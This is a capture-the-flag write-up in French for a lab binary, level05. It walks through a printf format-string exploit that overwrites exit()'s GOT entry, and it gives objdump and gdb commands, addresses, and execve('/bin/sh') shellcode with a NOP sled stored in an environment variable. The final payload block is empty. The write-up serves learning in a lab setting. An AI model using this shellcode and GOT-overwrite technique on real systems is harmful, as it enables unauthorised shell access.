
Dans cet exercice, le code nous demande un input, les lettres majuscules de cet input vont etre converti en minuscules.
ensuite notre input sera utilise dans printf.

plus loin dans le code on voit un appel a la fonction `exit()`. C'est ce qui nous met sur la piste d'overwrite la GOT.
La GOT est un tableau qui stocke les adresses en memoire des fonctions bas niveau.
`exit` nous empeche d'owerwrite return eip comme on le fait habituellement dans d'autres flags.

Une option de printf nous permet d'ecrire a une adresse le nombre de caracteres qu'on a ecris grace a printf, et en deux parties, 2 octets par 2 octets.
Avec ce flag on va pouvoir ecrire sur la GOT.

on commence par identifier l'adresse de `exit()` sur la GOT table.
```bash
objdump -R ./level05
```
du coup c'est `080497e0` l'adresse qu'on doit overwrite.

maintenant on cherche a inserer un shellcode, mais vu que notre input est converti en lowercase on ne peut pas le mettre en input, il serait corrompu.

on va mettre notre shellcode dans une variable d'env et on va regarder avec gdb quelle est l'adresse de cette variable d'env.
```bash
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

```bash
gdb ./level05
(gdb) break main
(gdb) run
(gdb) call (char*)getenv("SHELLCODE")
```

l'adresse est donc `0xffffd87b`

```bash

```

### exit avec gdb

```
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
```

l'adresse de exit dans la GOT table est donc `0x80497e0`
